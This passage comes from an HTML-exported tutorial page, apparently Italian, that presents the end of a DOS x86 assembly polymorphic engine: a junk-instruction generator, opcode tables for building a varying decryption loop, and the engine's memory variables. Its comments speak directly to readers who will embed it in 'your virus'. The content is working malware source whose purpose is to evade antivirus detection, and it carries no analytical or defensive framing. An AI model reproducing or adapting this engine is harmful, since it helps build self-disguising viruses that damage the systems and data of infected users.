yes">                   </span>; le prime 4 sono INT21<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>mov<span
style="mso-spacerun: yes">     </span>ah,byte ptr ds:[si]<span
style="mso-spacerun: yes">     </span>; prendi nella tabellina<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>jae<span
style="mso-spacerun: yes">     </span>not_21call<span style="mso-spacerun:
yes">              </span>; le ultime due non sono fatte all’INT21<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>mov<span
style="mso-spacerun: yes">     </span>al,0b4h<span style="mso-spacerun:
yes">                 </span>; opcode di di INT21<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>stosw<span
style="mso-spacerun: yes">                           </span>; mette
opcode+funzione in buffer<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:
EN-US'>mov<span style="mso-spacerun: yes">     </span>ah,21h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>not_21call:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span></span></b><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>mov<span style="mso-spacerun: yes">     </span>al,0cdh<span
style="mso-spacerun: yes">     </span><span style="mso-spacerun:
yes">            </span>; opcode chiamata INT<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>stosw<span
style="mso-spacerun: yes">                           </span>; mette
opcode+funzione in buffer<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:
EN-US'>jmp<span style="mso-spacerun: yes">     </span>garbage_loop<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>;----------------------------------------------------------------------------------<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; just_onebyters crea possibili istruzioni da un byte<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>just_onebyters:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span>call<span style="mso-spacerun: yes">    </span>sorta_random<span
style="mso-spacerun: yes">            </span>; <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span></span></b><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>and<span style="mso-spacerun: yes">     </span>ax,0fh<span
style="mso-spacerun: yes">                  </span>; AX tra 0 e 15<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>cmp<span
style="mso-spacerun: yes">     </span>al,6<span style="mso-spacerun:
yes">                    </span>; mettiamo un int call<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span></span></b><b><span
lang=FR style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:
FR'>ja<span style="mso-spacerun: yes">      </span>just_ints<span
style="mso-spacerun: yes">               </span>; passa se AL = 0,1,2,3,4,5,6<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=FR style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:FR'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=FR style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:FR'><span style="mso-spacerun: yes">      
</span></span></b><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>mov<span style="mso-spacerun: yes">     </span>si,offset
obyters<span style="mso-spacerun: yes">       </span>; carica offset tabella di
istruzioni<span style="mso-spacerun: yes">  </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>add<span
style="mso-spacerun: yes">     </span>si,ax<span style="mso-spacerun:
yes">                   </span>; prendi opcode scelto (da 0 a 6)<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>mov<span
style="mso-spacerun: yes">     </span>al,byte ptr ds:[si]<span
style="mso-spacerun: yes">     </span>; AL punta all’inizio tabella+ casuale
tra 0 e 6<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>stosb<span
style="mso-spacerun: yes">                           </span>; lo scrive nel
buffer <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>cmp<span
style="mso-spacerun: yes">     </span>al,0ebh<span style="mso-spacerun:
yes">                 </span>; 0eh=opcode di JMP. Abbiamo bisogno<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>jne<span
style="mso-spacerun: yes">     </span>garbage_loop<span style="mso-spacerun:
yes">            </span>; di un offset random<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>call<span
style="mso-spacerun: yes">    </span>sorta_random<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>and<span
style="mso-spacerun: yes">     </span>ax,0fh<span style="mso-spacerun:
yes">             </span><span style="mso-spacerun: yes">     </span>; in AX
casuale<span style="mso-spacerun: yes">  </span>tra 0 e 15<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>inc<span
style="mso-spacerun: yes">     </span>al<span style="mso-spacerun:
yes">                      </span>; ora tra 1 e 16<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>stosb<span
style="mso-spacerun: yes">                           </span>; scrive offset del
JMP che coincide <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun:
yes">                                       </span>; con CX (bytes saltati)<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:
EN-US'>push<span style="mso-spacerun: yes">    </span>cx<span
style="mso-spacerun: yes">        </span><span style="mso-spacerun:
yes">              </span>; preserva CX<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span></span></b><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>mov<span style="mso-spacerun: yes">     </span>cx,ax<span
style="mso-spacerun: yes">                   </span>; in CX casuale tra 1 e 16<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>krap_bytes:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>call<span
style="mso-spacerun: yes">    </span>sorta_random<span style="mso-spacerun:
yes">            </span>; prende bytes a casaccio <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>stosb<span
style="mso-spacerun: yes">                           </span>; e li scrive.
Questi verranno saltati<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">     </span><span
style="mso-spacerun: yes">  </span>loop<span style="mso-spacerun: yes">   
</span>krap_bytes<span style="mso-spacerun: yes">              </span>; max. 16
volte perché il JMP è short<span style="mso-spacerun: yes">  </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>pop<span
style="mso-spacerun: yes">     </span>cx<span style="mso-spacerun:
yes">                      </span>; ripristina CX<span style="mso-spacerun:
yes">    </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>garbage_loop:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>pop<span
style="mso-spacerun: yes">     </span>si<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>dec<span
style="mso-spacerun: yes">     </span>bx<span style="mso-spacerun:
yes">                      </span>; decrementa contatore num. di istruzioni
garbage<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>jz<span
style="mso-spacerun: yes">      </span>exit_garbage<span style="mso-spacerun:
yes">            </span>; loop principale del garbage<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>jmp<span
style="mso-spacerun: yes">     </span>garbage<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>exit_garbage:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>ret<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>;----------------------------------------------------------------------------------<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; possibili istruzioni da un byte generabili<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>obyters<span style="mso-spacerun: yes">  </span><span
style="mso-spacerun: yes">       </span>db<span style="mso-spacerun: yes">     
</span>90h,0ebh,0f8h,0f9h,0fch,0fdh,0ebh<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; nop, jmp short, clc, stc, cld, std, jmp short (di nuovo :P e
il + usato)<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>;----------------------------------------------------------------------------------<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; la generazione di garbage avviene con due tabelle.
un'istruzione verra'<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; presa dalla prima (base_ocs + n, dove n e' il numero casuale)
e poi dalla<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; seconda verra' preso il rispettivo prefisso (base_prefix + n).
se questo<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; e' zero allora vuol dire che e' un'istruzione da un byte (vedi
ad esempio<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; inc e dec), mentre per le altre il prefisso verra'
direttamente copiato in<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; mem. a quella base ovviamente verra' aggiunto la mask per il
dato registro<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; scelto<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>base_ocs<span style="mso-spacerun: yes">        </span>db<span
style="mso-spacerun: yes">    
</span>040h,048h,0f8h,0c0h,0c8h,0d0h,0d8h,0d0h,0d8h,0c0h,0c8h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">                </span>db<span
style="mso-spacerun: yes">    
</span>0e0h,0e8h,0c0h,0e8h,0f0h,0d0h,0d8h,0c8h,0e0h,0f8h,0b8h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">                </span>db<span
style="mso-spacerun: yes">    
</span>0e8h,0c0h,0f0h,0c8h,0e0h,0f8h,0d0h,0d8h,0c0h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>base_prefix<span style="mso-spacerun: yes">     </span>db<span
style="mso-spacerun: yes">    
</span>000h,000h,0d1h,0d3h,0d3h,0d1h,0d1h,0f7h,0f7h,0d1h,0d1h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">                </span>db<span
style="mso-spacerun: yes">     </span>0d1h,0d1h,083h,083h,083h,083h,083h,083h,083h,083h,000h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">                </span>db<span
style="mso-spacerun: yes">    
</span>081h,081h,081h,081h,081h,081h,081h,081h,0f7h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>;----------------------------------------------------------------------------------<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; possibili chiamate ad interrupts generabili. le prime quattro
sono da<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; interpretarsi come funzioni (quindi byte da mettere in AH)
all'int 21h,<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; mentre le ultime due sono l'int 11h (get enviroment) e int 12h
(get avaiable<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; memory in kbs).<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>inters<span style="mso-spacerun: yes">          </span>db<span
style="mso-spacerun: yes">     </span>019h,054h,00bh,018h,011h,012h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>;----------------------------------------------------------------------------------<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; tutto quello oltre a questa riga sono solo variabili
temporanee usate dalla<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; poly, quindi non ha senso includerle con il body del vostro
virus ma tenere<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; solo abbastanza spazio in mem<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>poly_mem_start:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>given_si<span style="mso-spacerun: yes">        </span>dw<span
style="mso-spacerun: yes">       </span>00h<span style="mso-spacerun:
yes">            </span>; pointer a cosa encrittare<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>lenght<span style="mso-spacerun: yes">          </span>dw<span
style="mso-spacerun: yes">       </span>00h<span style="mso-spacerun:
yes">            </span>; lunghezza da encrittare<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>pointer_ass<span style="mso-spacerun: yes">     </span>dw<span
style="mso-spacerun: yes">       </span>00h<span style="mso-spacerun:
yes">            </span>; dove viene assegnato il pointer<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>initial_key<span style="mso-spacerun: yes">     </span>dw<span
style="mso-spacerun: yes">       </span>00h<span style="mso-spacerun:
yes">            </span>; chiave iniziale<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>decr_begin<span style="mso-spacerun: yes">      </span>dw<span
style="mso-spacerun: yes">       </span>00h<span style="mso-spacerun:
yes">            </span>; dove comincia la crittazione<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>counter_ass<span style="mso-spacerun: yes">     </span>dw<span
style="mso-spacerun: yes">       </span>00h<span style="mso-spacerun:
yes">            </span>; dove viene assegnato il counter<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>;----------------------------------------------------------------------------------<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; queste tre variabili contengono 0ffh se il rispettivo registro
non e'<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; stato ancora settato, mentre contengono il codice in bit del
registro<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; scelto se ne e' gia' stato uno<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>already_pnt<span style="mso-spacerun:
yes">     </span>db<span style="mso-spacerun: yes">      </span>0ffh<span
style="mso-spacerun: yes">            </span>; registro come pointer<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>already_cnt<span style="mso-spacerun:
yes">     </span>db<span style="mso-spacerun: yes">      </span>0ffh<span
style="mso-spacerun: yes">    </span><span style="mso-spacerun:
yes">        </span>; registro come counter<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>already_key<span style="mso-spacerun:
yes">     </span>db<span style="mso-spacerun: yes">      </span>0ffh<span
style="mso-spacerun: yes">            </span>; registro come key<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>;----------------------------------------------------------------------------------<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; queste contengono il numero di operazioni di un dato tipo gia'
fatte.<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>change_key<span style="mso-spacerun: yes">      </span>db<span
style="mso-spacerun: yes">       </span>00h<span style="mso-spacerun:
yes">            </span>; operazione di cambio chiave<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>dec_cnt_nr<span style="mso-spacerun: yes">      </span>db<span
style="mso-spacerun: yes">       </span>00h<span style="mso-spacerun:
yes">            </span>; operazione di decremento counter<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>inc_pnt_nr<span style="mso-spacerun: yes">      </span>db<span
style="mso-spacerun: yes">       </span>00h<span style="mso-spacerun:
yes">            </span>; operazione di incremento pointer<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>math_opdone<span style="mso-spacerun: yes">     </span>db<span
style="mso-spacerun: yes">       </span>00h<span style="mso-spacerun:
yes">            </span>; operazione matematica di crittazione<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; queste due variabili sono usate per segnalare, quando e' il
caso, l'ordine<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; nel quale e' stato creato il decryption loop. Infatti se uno o
due incrementi<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; al puntatore avvengono prima dell'operazione matematica allora
dovremo stare<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; attenti a cominciare anche l'encrypting uno o due byte piu'
tardi. Lo stesso<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; discorso vale per la chiave: se questa e' stata modificata una
volta prima<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; dell'operazione matematica allora anche nell'encryptor dovremo
modificarla<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; prima di usarla.<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>pnt_sba<span style="mso-spacerun: yes">         </span>db<span
style="mso-spacerun: yes">       </span>00h<span style="mso-spacerun:
yes">            </span>; numero di incs prima di math op<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>pre_kdn<span style="mso-spacerun: yes">         </span>db<span
style="mso-spacerun: yes">       </span>00h<span style="mso-spacerun:
yes">            </span>; segnala se key cambiata prima<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>;----------------------------------------------------------------------------------<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>poly_mem_end:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; Grandezza totale variabili della poly in memoria (quindi se
usata nel<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; vostro virus non ha senso mettere anche queste nel file, ma vi
basta<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; allocare abbastanza mem)<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>poly_mem<span style="mso-spacerun:
yes">        </span>=<span style="mso-spacerun: yes">       </span>(offset
poly_mem_end - offset poly_mem_start)<o:p></o:p></span></b></p>

</div>

</body>

</html>
